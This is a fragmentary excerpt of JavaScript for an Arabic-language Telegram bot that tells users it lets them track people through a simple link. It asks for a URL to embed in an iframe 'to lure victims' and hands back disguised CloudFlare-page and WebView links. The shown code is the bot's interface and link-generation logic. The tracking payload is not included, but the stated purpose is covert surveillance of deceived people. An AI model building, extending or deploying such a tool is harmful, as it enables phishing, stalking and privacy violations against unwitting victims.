...
if(msg?.reply_to_message?.text=="🌐 ادخل الرابط"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"عمل رابط",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `اهلا بك ${msg.chat.first_name} ! , \n يمكنك استخدام هذا البوت  لتعقب الأشخاص فقط من خلال رابط بسيط.
...
bot.sendMessage(chatId,` من خلال هذا البوت ، يمكنك تتبع الأشخاص فقط عن طريق إرسال رابط بسيط.
 ...
 سيطلب منك  عنوان URL الذي سيتم استخدامه في iframe لجذب الضحايا.
بعد الاستلام
...
جميع الحقوق محفوظه ل احمد @k5kil
`);
}
...
bot.sendMessage(cid, `تم إنشاء روابط جديدة بنجاح ، ويمكنك استخدام أي من الروابط أدناه.\nURL: ${msg}\n\n✅ الروابط الخاصة بك\n\n🌐 ارتباط صفحة CloudFlare\n${f}\n\n🌐 رابط صفحة WebView\n${g}`,m);
}
else{
...
bot.sendMessage(cid,`🌐 ارسال الرابط`,mk);
}
